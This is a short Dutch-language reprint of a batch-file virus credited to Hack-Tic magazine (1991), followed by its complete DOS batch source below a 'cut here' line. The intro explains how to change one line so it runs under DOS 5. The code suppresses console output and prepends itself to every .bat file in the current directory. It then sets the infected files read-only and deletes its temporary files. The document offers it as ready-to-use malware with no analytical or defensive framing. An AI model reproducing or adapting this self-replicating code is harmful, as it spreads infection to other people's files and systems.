Het Hack-Tic batchvirus zoals gepubliceerd in Hack-Tic nummer 14/15 van 1991.
Als je het virus alleen in DOS5 wilt laten draaien kun je de regel

for %%f in (*.bat) do command /c snotkop %%f

vervangen door

for %%f in (*.bat) do call snotkop %%f

----------<CUT HERE>---------------------------------------------------------

@ctty nul:

copy %0.bat/A snotkop.&&&/A
echo HACK-TIC >snotkop.###
echo :reutel >> snotkop.###
echo ctty con: >> snotkop.###
copy snotkop.&&&/B+ snotkop.###/B

echo copy %%1 snotkop.$$$ > snotkop.bat
echo copy snotkop.&&& %%1 >> snotkop.bat
echo copy %%1/B+ snotkop.$$$ >> snotkop.bat
echo attrib +r %%1 >> snotkop.bat

attrib +r snotkop.bat
for %%f in (*.bat) do command /c snotkop %%f

attrib -r snotkop.bat
del snotkop.*

goto reutel
